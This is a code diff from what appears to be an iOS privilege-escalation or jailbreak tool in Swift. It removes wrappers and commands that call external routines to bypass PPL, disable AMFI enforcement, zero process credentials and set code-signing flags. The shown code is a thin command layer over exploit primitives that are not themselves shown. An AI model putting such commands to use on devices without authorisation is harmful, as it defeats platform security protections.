@@ -67,25 +67,12 @@ func csops(_ pid: pid_t, _ ops: UInt32, _ useraddr: UnsafeMutableRawPointer, _ u
 
 // MARK: - OmegaBootstrap
 
-// MARK: - Forward declarations for privilege escalation (amfi/ppl)
 // These C functions are linked at build-time from external objects.
-@_silgen_name("ppl_bypass_ucred_direct")
-func ppl_bypass_ucred_direct(_ proc: UInt64) -> Int32
 
-@_silgen_name("amfi_disable_mac_proc_enforce")
-func amfi_disable_mac_proc_enforce() -> Bool
 
-@_silgen_name("amfi_patch_proc_csflags")
-func amfi_patch_proc_csflags(_ pid: Int32) -> Bool
 
-@_silgen_name("amfi_is_root")
-func amfi_is_root() -> Bool
 
-@_silgen_name("amfi_elevate_to_root")
-func amfi_elevate_to_root() -> Int32
 
-@_silgen_name("ppl_bypass")
-func ppl_bypass() -> Int32
 
 final class OmegaBootstrap {
 
@@ -595,35 +582,8 @@ private static func registerKernel() {
 
         // MARK: - Privilege Escalation Commands
 
-        OmegaCore.register("set-all-ids-zero") { _, mgr in
-            guard mgr.dsready else { return .fail("set-all-ids-zero: exploit not ready — run 'run' first") }
-            let ourProc = ds_get_our_proc()
-            guard ourProc != 0 else { return .fail("set-all-ids-zero: our_proc = 0") }
-            let result = ppl_bypass_ucred_direct(ourProc)
-            if result == 0 {
-                return .ok(String(format: "set-all-ids-zero: ucred patched — uid=%d ✔️", getuid()))
-            } else {
-                return .fail(String(format: "set-all-ids-zero: failed (code=%d) — PPL may block ucred write", result))
-            }
-        }
 
-        OmegaCore.register("amfi-disable-globally") { _, mgr in
-            guard mgr.dsready else { return .fail("amfi-disable-globally: exploit not ready — run 'run' first") }
-            if amfi_disable_mac_proc_enforce() {
-                return .ok("amfi-disable-globally: mac_proc_enforce disabled ✔️")
-            } else {
-                return .fail("amfi-disable-globally: failed — offset may be unknown (0xFFFFFFFF)")
-            }
-        }
 
-        OmegaCore.register("cs-remove-all-restrictions") { _, mgr in
-            guard mgr.dsready else { return .fail("cs-remove-all-restrictions: exploit not ready — run 'run' first") }
-            if amfi_patch_proc_csflags(getpid()) {
-                return .ok("cs-remove-all-restrictions: CS_VALID | CS_PLATFORM_BINARY | CS_DEBUGGED set ✔️")
-            } else {
-                return .fail("cs-remove-all-restrictions: failed — amfi offset may be unknown")
-            }
-        }
 
         OmegaCore.register("root") { _, mgr in
             guard mgr.dsready else { return .fail("root: exploit not ready — run 'run' first") }
